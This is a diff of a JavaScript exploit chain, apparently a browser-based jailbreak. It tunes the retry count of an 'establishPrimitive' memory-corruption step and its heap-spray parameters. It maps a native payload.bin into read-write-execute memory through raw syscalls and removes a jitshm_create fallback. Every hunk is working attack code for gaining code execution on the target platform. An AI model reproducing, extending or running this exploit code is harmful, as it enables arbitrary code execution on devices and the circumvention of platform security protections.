@@ -251,11 +251,7 @@ function makeRpc(worker) {
                 + (payload[0] === 0xe9 ? " entry=e9-jmp-rel32"
                                        : " entry=NOT-e9")
             : "NOT LOADED -- stage 10 will not run");
-        mark("PAYLOAD-CONTINUE", payload
-            ? "payload.bin verified; continuing to the primitive stage"
-            : "payload.bin missing; stage 10 will be skipped");
 
-        mark("PRIMITIVE-START", "starting establishPrimitive; payload execution waits for PRIMITIVE-OK");
         const ITERS = params.has("iters") ? parseInt(params.get("iters"), 10) : 400;
         const SPRAY_NUM = params.has("spray")
             ? parseInt(params.get("spray"), 10) : 0x200;
@@ -293,7 +289,7 @@ function makeRpc(worker) {
 
         await new Promise(function (r) { setTimeout(r, 0); });
         const carrier = await establishPrimitive({
-            maxAttempts: 1,
+            maxAttempts: 6,
 
             onEvent: function (tag, detail, attempt) {
                 mark(tag, (attempt != null ? '[' + attempt + '] ' : '')
@@ -3345,21 +3341,11 @@ function makeRpc(worker) {
 
                                     const psize = (payload.length + 0x3fff) & ~0x3fff;
                                     const pr = PROT_READ | PROT_WRITE | PROT_EXEC;
-                                    let em = scAny(SYS9.mmap, 0, psize, pr,
+                                    const em = scAny(SYS9.mmap, 0, psize, pr,
                                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-                                    let mapMode = "private-anon";
-                                    if (em.i32 === -1) {
-                                        const jitFd = scAny(SYS9.jitshm_create, 0, psize, pr).i32;
-                                        if (jitFd >= 0) {
-                                            em = scAny(SYS9.mmap, 0, psize, pr,
-                                                1, jitFd, 0);
-                                            scAny(SYS.close, jitFd);
-                                            mapMode = "jit-shared";
-                                        }
-                                    }
                                     const entry = new int64(em.lo, em.hi);
                                     mark("PAYLOAD-MAP", "mmap(0, 0x" + psize.toString(16)
-                                        + ", rwx, " + mapMode + ") = " + entry);
+                                        + ", rwx, PRIVATE|ANON) = " + entry);
                                     const entryOk = em.i32 !== -1
                                         && !(entry.low === 0 && entry.hi === 0);
                                     check("the payload has " + payload.length
